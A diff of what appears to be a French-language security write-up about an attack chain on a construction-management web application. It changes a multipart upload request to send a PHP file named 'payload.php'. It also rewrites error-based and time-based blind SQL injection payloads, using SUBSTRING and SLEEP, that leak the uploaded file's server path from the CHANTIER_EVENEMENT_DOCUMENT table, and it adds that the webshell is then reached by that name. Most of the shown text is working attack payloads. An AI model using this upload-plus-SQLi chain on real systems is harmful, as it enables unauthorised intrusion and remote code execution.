@@ -246,7 +246,7 @@ Content-Disposition: form-data; name="type"
 
 PLAN
 ------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name="file"; filename="test.php"
+Content-Disposition: form-data; name="file"; filename="payload.php"
 Content-Type: application/x-php
 
 <html>
@@ -280,28 +280,28 @@ Cependant, on ne connait pas son chemin. Mais on peut le récupérer via une SQL
 On peut donc passer par une SQLi pour connaitre le chemin du fichier qu'on envoi:
 
 Error Based:
-```
+```sql
 AND (
   SELECT SUBSTRING(
     (SELECT chemin
      FROM CHANTIER_EVENEMENT_DOCUMENT
-     WHERE nom_fichier='test.txt'
+     WHERE nom_fichier='payload.php'
      LIMIT 1),
   1,1)
 ) = 'a'
 ```
 
-```
-AND (SELECT substr(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='test.txt')= 'a' --
+```sql
+AND (SELECT substr(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)= 'a' --
 ```
 
 Time Based:
-```
+```sql
 1 AND IF(
   SUBSTRING(
     (SELECT chemin
      FROM CHANTIER_EVENEMENT_DOCUMENT
-     WHERE nom_fichier='test.txt'
+     WHERE nom_fichier='payload.php'
      LIMIT 1),
   1,1
   ) = 'a',
@@ -311,16 +311,9 @@ Time Based:
 ```
 
 ```sql
-('SELECT *
-
-FROM SALARIE
-
-WHERE archive=0
-
-AND contrat != 5 AND contrat != 6 AND contrat != 7 AND contrat != 8
-
-AND agence='.$secteur.'
-
-ORDER BY nom')
+1 AND IF((SELECT SUBSTR(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='payload.php' LIMIT 1)='a',SLEEP(5),0)--
 ```
+
+Ensuite on accède au webshell via le nom du fichier qu'on récupère
+
 
